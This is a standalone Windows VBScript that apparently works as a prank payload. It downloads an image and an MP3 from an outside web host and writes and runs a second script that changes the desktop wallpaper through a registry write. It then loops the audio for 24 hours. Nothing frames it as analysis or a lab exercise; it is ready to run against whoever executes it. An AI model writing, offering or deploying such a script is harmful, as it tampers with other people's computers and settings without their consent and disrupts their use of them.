Dim wshNetwork : Set wshNetwork = CreateObject("WScript.Network")
Dim strUsername : strUsername = wshNetwork.UserName
'Get image data
Dim document : Set document = WScript.GetObject("https://pwcreatures.vercel.app/bin/oQgVEcfyA6NGPHjrAAzAIkKA93lg0CAAAeh7Nb~noop.jpeg")
While document.readyState <> "complete" : WScript.Sleep 200 : Wend
Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP.3.0")
xhr.open "GET", document.getElementsByTagName("img")(0).src, False
xhr.send
Dim stream : Set stream = CreateObject("Adodb.Stream")
stream.Type = 1
stream.Open
stream.Write xhr.responseBody
stream.SaveToFile "C:\Users\" & strUsername & "\Downloads\LemonZS.jpg", 2
stream.Close
'Get music data
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://pwcreatures.vercel.app/bin/music.mp3", False
xHttp.Send
with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3", 2 
end with
'Set subfolder
Set objFSO = CreateObject("Scripting.FileSystemObject")
strUsername = CreateObject("WScript.Network").UserName
strFolder = "C:\Users\" & strUsername & "\Downloads"
strFile = strFolder & "\LemonZS.vbs"
lines = Array( _
    "Set objShell = CreateObject(""WScript.Shell"")", _
    "Dim wshNetwork : Set wshNetwork = CreateObject(""WScript.Network"")", _
    "Dim strUsername : strUsername = wshNetwork.UserName", _
    "strLocalPath = ""C:\Users\" & strUsername & "\Downloads\LemonZS.jpg""", _
    "objShell.RegWrite ""HKCU\Control Panel\Desktop\Wallpaper"", strLocalPath", _
    "objShell.Run ""%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"", 1, True" _
)
Set objFile = objFSO.CreateTextFile(strFile, True)
For Each line In lines
    objFile.WriteLine line
Next
objFile.Close
Set objFSO = Nothing
'Set image
Dim objShell
Set objShell = CreateObject("WScript.Shell")
strProfileFolder = objShell.ExpandEnvironmentStrings("%UserProfile%")
strPath = strProfileFolder & "\Downloads\LemonZS.vbs"
objShell.Run strPath
WScript.Sleep 1000
objShell.Run strPath
WScript.Sleep 1000
objShell.Run strPath
WScript.Sleep 1000
objShell.Run strPath
Set objShell = Nothing
'Set music
Set objShell = CreateObject("WScript.Shell")
Set objWMPlayer = CreateObject("WMPlayer.OCX")
strMusicPath = "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3"
objWMPlayer.URL = strMusicPath
objWMPlayer.settings.setMode "loop", True
objWMPlayer.settings.setMode "autoRewind", True
objWMPlayer.controls.play
WScript.Sleep 86400000
Set objShell = Nothing
Set objWMPlayer = Nothing
